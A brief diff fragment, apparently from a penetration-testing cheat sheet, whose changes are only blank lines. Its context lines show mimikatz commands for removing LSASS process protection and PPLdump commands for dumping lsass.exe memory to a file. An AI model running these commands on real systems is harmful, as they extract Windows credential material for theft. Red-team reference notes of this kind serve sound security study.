@@ -33,8 +33,11 @@ mimikatz # !processprotect /process:lsass.exe
 # Unload the service created
 mimikatz # !-
 
+
 # https://github.com/itm4n/PPLdump
 PPLdump.exe [-v] [-d] [-f] <PROC_NAME|PROC_ID> <DUMP_FILE>
 PPLdump.exe lsass.exe lsass.dmp
 PPLdump.exe -v 720 out.dmp
 ```
+
+
